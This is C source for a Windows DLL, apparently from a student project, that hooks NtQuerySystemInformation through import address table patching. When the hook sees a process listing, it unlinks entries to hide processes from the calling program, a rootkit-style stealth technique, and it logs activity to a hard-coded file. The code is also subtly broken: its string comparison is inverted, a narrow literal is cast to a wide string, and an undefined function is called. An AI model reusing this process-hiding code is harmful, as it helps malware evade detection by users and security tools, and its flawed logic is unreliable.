#include "../includes/dll.h"

NtQuerySystemInformationHk OrigNtQuerySystemInformation;

static void getsysinfo(SYSTEM_INFORMATION_CLASS SystemInformationClass)
{
    switch (SystemInformationClass)
    {
    case SystemBasicInformation:
        Mylog("SystemBasicInformation", 0, TRUE);
        break;
    case SystemPerformanceInformation:
        Mylog("SystemPerformanceInformation", 0, TRUE);
        break;
    case SystemTimeOfDayInformation:
        Mylog("SystemTimeOfDayInformation", 0, TRUE);
        break;
    case SystemProcessInformation:
        Mylog("SystemProcessInformation", 0, TRUE);
        break;
    case SystemProcessorPerformanceInformation:
        Mylog("SystemProcessorPerformanceInformation", 0, TRUE);
        break;
    case SystemInterruptInformation:
        Mylog("SystemInterruptInformation", 0, TRUE);
        break;
    case SystemExceptionInformation:
        Mylog("SystemExceptionInformation", 0, TRUE);
        break;
    case SystemRegistryQuotaInformation:
        Mylog("SystemRegistryQuotaInformation", 0, TRUE);
        break;
    case SystemLookasideInformation:
        Mylog("SystemLookasideInformation", 0, TRUE);
        break;
    case SystemCodeIntegrityInformation:
        Mylog("SystemCodeIntegrityInformation", 0, TRUE);
        break;
    case SystemPolicyInformation:
        Mylog("SystemPolicyInformation", 0, TRUE);
        break;
    default:
        Mylog("Noinfo", 0, TRUE);

        break;
    }
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
)
{
	NTSTATUS status = OrigNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    
    if (!NT_SUCCESS(status)) {
        char buf[1024];
        sprintf(buf, "OrigNtQuerySystemInformation failed: 0x%08X\n", status);
        Mylog(buf, 0, TRUE);
    }
    getsysinfo(SystemInformationClass);
	if (SystemInformationClass == SystemProcessInformation)
	{
		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoCurr = NULL;
		PSYSTEM_PROCESS_INFORMATION_HK sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)(SystemInformation);
        
        do
        {
            sysProcInfoCurr = sysProcInfoNext;
            sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)((PUCHAR)sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
            if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"test.exe"))
            {
                Mylog(sysProcInfoNext->ImageName.Buffer, 1, TRUE);
                if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
                else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
            }
        } while (sysProcInfoCurr->NextEntryOffset);
        // while (sysProcInfoCurr)
		// {
        //     Mylog("Inside loop with sysProcInfoCurr", 0, TRUE);
		// 	if (wcscmp(sysProcInfoNext->ImageName.Buffer, (PWSTR)"test.exe"))
        //     {
        //         Mylog(sysProcInfoNext->ImageName.Buffer, 1, TRUE);
        //         if (sysProcInfoNext->NextEntryOffset == 0) sysProcInfoCurr->NextEntryOffset = 0;
        //         else sysProcInfoCurr->NextEntryOffset += sysProcInfoNext->NextEntryOffset;
        //     }
        //     sysProcInfoCurr = sysProcInfoNext;
        //     sysProcInfoNext = (PSYSTEM_PROCESS_INFORMATION_HK)(sysProcInfoCurr + sysProcInfoCurr->NextEntryOffset);
		// }
	}
    return status;
}

VOID Mylog(void *toMyLog, int MODE, BOOL putDate)
{
    FILE *f = fopen("C:\\Users\\Administrateur\\Documents\\tinky-winkey\\test.log", "a+");
    if (putDate)
    {
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        fprintf(f, "\n[Throw dll injection][%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
    }
    if (!MODE) fprintf(f, "[Str][%s]\n", (char *)toMyLog);
    else if (MODE == 1) fprintf(f, "[WildStr][%ws]\n", (WCHAR *)toMyLog);
    else fprintf(f, "[Digit][%d]\n", *((int*)toMyLog));
    fclose(f);
}

//https://www.youtube.com/watch?v=uS22dBJpr7U
void StartHook()
{
    Mylog("Inside StartHook function.",0, TRUE);
    MODULEINFO moduleInfo = {0};
    HMODULE hModule= GetModuleHandle(NULL);//charge le module courant quand LPCSTR == 0 => Si ce paramètre est NULL, GetModuleHandle retourne un handle au fichier utilisé pour créer le processus appelant (fichier.exe).
    GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo));
    LPBYTE baseAddr = (LPBYTE)moduleInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)baseAddr;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(baseAddr + pImgDosHdr->e_lfanew);//https://0xrick.github.io/win-internals/pe3/
    PIMAGE_OPTIONAL_HEADER pImgOptHdr = (PIMAGE_OPTIONAL_HEADER)&(pImgNtHdr->OptionalHeader);
    PIMAGE_IMPORT_DESCRIPTOR pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddr + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); //IAT table => https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking c'est un import statique, si la fonction est importe de facon dynamique, cette technique ne fonctionnera pas.

    for (; pImgImpDesc->Characteristics; pImgImpDesc++)
    {
        if (strcmp("ntdll.dll", (char *)(baseAddr + pImgImpDesc->Name)) == 0)//Name is an offset
        {
            Mylog("Found ntdll.dll", 0, TRUE);
            break;
        }

    }
    PIMAGE_THUNK_DATA pImgThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->OriginalFirstThunk);
    PIMAGE_THUNK_DATA pImgFirstThData = (PIMAGE_THUNK_DATA)(baseAddr + pImgImpDesc->FirstThunk);
    PIMAGE_IMPORT_BY_NAME pImgImpByName;
    for (; !(pImgThData->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pImgThData->u1.AddressOfData; pImgThData++)
    {
        pImgImpByName = (PIMAGE_IMPORT_BY_NAME)(baseAddr + pImgThData->u1.AddressOfData);
        if (strcmp("NtQuerySystemInformation", (char *)pImgImpByName->Name) == 0)
        {
            Mylog("Found NtQuerySystemInformation in IAT", 0, TRUE);
            break;
        }
        pImgFirstThData++;
    }
    DWORD dwOld = 0;
    VirtualProtect((PVOID)&(pImgFirstThData->u1.Function), sizeof(dwOld), PAGE_READWRITE, &dwOld);
    pImgFirstThData->u1.Function = (ULONGLONG)HookedNtQuerySystemInformation;
    VirtualProtect((PVOID)&(pImgFirstThData->u1.Function), sizeof(dwOld), dwOld, NULL);
    CloseHandle(hModule);
    log("StartHook seems to have worked.", 0, TRUE);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Mylog("DLL_PROCESS_ATTACH", 0, TRUE);
        OrigNtQuerySystemInformation  = (NtQuerySystemInformationHk)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
        StartHook();
        break;
    case DLL_PROCESS_DETACH:
        Mylog("DLL_PROCESS_DETACH", 0, TRUE);
        break;
    default:
        break;
    }
    return TRUE;
}